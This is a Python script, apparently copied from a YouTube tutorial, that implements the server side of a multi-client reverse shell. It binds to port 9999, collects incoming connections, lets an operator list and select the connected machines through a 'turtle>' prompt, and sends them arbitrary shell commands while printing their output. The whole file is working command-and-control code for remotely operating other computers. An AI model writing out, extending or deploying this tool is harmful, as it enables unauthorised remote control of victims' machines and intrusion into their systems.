import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        global host
        global port 
        global s #socket
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation fail, error: " + str(msg))

#Binding socket & listening for connections
def bind_socket():
    try:
        global host
        global port 
        global s #socket
        
        print("Binding Port: " + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Binding Socket fail, error: " + str(msg)+ "Trying again")
        bind_socket()

# 1st theard. - Handling connections from multiples clients

def accepting_conns():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)    # prevents timeout   OJO

            all_connections.append(conn)
            all_address.append(address)

            print("Connection established: " + address[0])

        except:
            print("Connection failed")



# 2nd thread  - a)List clients  b) Select client    3) Send commands to client
            
def start_turtle(): #Create terminals for clients
    

    while True:
        cmd = input("turtle> ")
        if cmd == "list":
            list_conns()

        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Wrong command")

            
def list_conns():
    results=""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results += str(i) + "     Conecction Active  " + str(all_address[i][0]) + ":" + str(all_address[i][1]) + "\n"
    
    print("------------ Clients Active------------" + "\n" + results + "\n")

def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print("Connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Selection not found")
        return None

def send_target_commands(conn):
    while True:
        try:                
            cmd = input()
            if cmd == "quit" :
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")

        except:
            print("Wrong command")
            break

def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_conns()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_threads()
create_jobs()





#https://www.youtube.com/watch?v=6jteAOmdsYg&list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF